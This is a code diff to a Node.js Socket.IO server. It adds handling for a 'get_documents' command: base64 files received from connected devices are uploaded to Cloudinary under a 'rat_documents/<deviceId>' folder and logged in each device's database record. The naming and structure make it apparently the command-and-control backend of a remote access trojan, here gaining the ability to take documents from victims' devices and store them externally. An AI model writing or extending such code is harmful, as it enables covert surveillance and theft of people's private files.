@@ -303,6 +303,38 @@ io.on('connection', async (socket) => {
             };
           }
 
+          // For document result with base64 data → Upload to Cloudinary
+          if (cleanResult && cleanResult.data && cleanResult.command === 'get_documents') {
+            try {
+              const mimeType = cleanResult.mimeType || 'application/octet-stream';
+              const resourceType = mimeType.startsWith('image/') ? 'image' : 'raw';
+              const uploadRes = await cloudinary.uploader.upload(
+                `data:${mimeType};base64,${cleanResult.data}`,
+                { folder: `rat_documents/${socket.deviceId}`, resource_type: resourceType }
+              );
+              cleanResult.cloudinaryUrl = uploadRes.secure_url;
+              cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              delete cleanResult.data;
+            } catch (cloudErr) {
+              console.error('Cloudinary document upload error:', cloudErr.message);
+            }
+          }
+
+          // If document was uploaded to Cloudinary, push to data.documents array
+          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_documents') {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.documents': {
+                url: cleanResult.cloudinaryUrl,
+                publicId: cleanResult.cloudinaryPublicId,
+                name: cleanResult.name || 'document',
+                size: cleanResult.size || 0,
+                mimeType: cleanResult.mimeType || 'application/octet-stream',
+                timestamp: new Date()
+              }
+            };
+          }
+
           // Persist result data into device.data
           const dataSetOps = {};
           if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
